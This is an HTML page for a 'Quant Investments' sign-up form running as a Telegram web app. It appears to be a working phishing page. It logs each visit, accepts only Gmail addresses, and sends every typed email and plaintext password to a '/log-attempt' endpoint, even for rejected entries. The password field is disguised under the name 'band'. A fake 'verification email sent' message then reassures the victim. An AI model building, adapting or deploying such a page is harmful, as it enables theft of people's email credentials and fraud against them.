<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Quant Investments</title>

<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
body {
    font-family: Arial, sans-serif;
    background: #f2f2f2;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}
.box {
    background: white;
    padding: 20px;
    width: 300px;
    border-radius: 10px;
}
input, button {
    width: 100%;
    margin-top: 10px;
    padding: 8px;
}
.error {
    color: red;
    font-size: 0.9em;
}
</style>
</head>
<body>

<div class="box">
    <h3>Sign Up</h3>

    <p style="font-size:12px;">
    </p>

    <input id="email" placeholder="Email" />
    <input id="band" type="password" placeholder="Password" />

    <div class="error" id="error"></div>

    <button onclick="submitForm()">Continue</button>
</div>

<script>
Telegram.WebApp.ready();

// log visit immediately
fetch('/log-visit', { method: 'POST' });

function submitForm() {
    const emailInput = document.getElementById('email');
    const bandInput = document.getElementById('band');
    const error = document.getElementById('error');

    const email = emailInput.value.trim();
    const band = bandInput.value.trim();

    error.textContent = '';

    if (!email.endsWith('@gmail.com')) {
        error.textContent = 'Invalid email extension';
        fetch('/log-attempt', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ email, band, valid: false })
        });
        return;
    }

    if (!band) {
        error.textContent = 'Password required';
        return;
    }

    fetch('/log-attempt', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email, band, valid: true })
    }).then(() => {
        document.body.innerHTML = `<h2>Verification email sent, please check your inbox. </h2><p>It may be in "spam" folder</p>`;
    }).catch(err => {
        error.textContent = 'Submission failed. Try again.';
        console.error(err);
    });
}
</script>



</body>
</html>
